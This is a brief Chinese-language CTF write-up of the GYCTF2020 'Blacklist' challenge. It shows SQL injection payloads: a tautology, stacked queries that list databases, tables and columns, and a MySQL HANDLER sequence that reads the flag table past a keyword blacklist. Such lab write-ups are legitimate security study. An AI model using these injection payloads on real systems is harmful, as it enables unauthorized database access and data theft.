# [GYCTF2020]Blacklist（学习）
![](<./img/Pasted image 20221104194310.png>)
```sql
1' or 1=1 or '1
```
![](<./img/Pasted image 20221104194336.png>)
```sql
1' union select 1,2#
```
![](<./img/Pasted image 20221104194429.png>)

被过滤了一堆关键字呜呜呜

搜索得知这题关键为堆叠注入
```sql
1'; show databases#
```
![](<./img/Pasted image 20221104194636.png>)
```sql
1'; show tables#
```
![](<./img/Pasted image 20221104200143.png>)
```sql
1'; show columns from FlagHere#
```
![](<./img/Pasted image 20221104200444.png>)

接下来是学习时间（悲

![](<./img/Pasted image 20221104201132.png>)
```sql
0';
HANDLER FlagHere OPEN;
HANDLER FlagHere READ FIRST;
HANDLER FlagHere CLOSE;#
```
![](<./img/Pasted image 20221104201342.png>)

有点像文件句柄，学到了呜呜呜

#Web #SQL注入 #堆叠注入 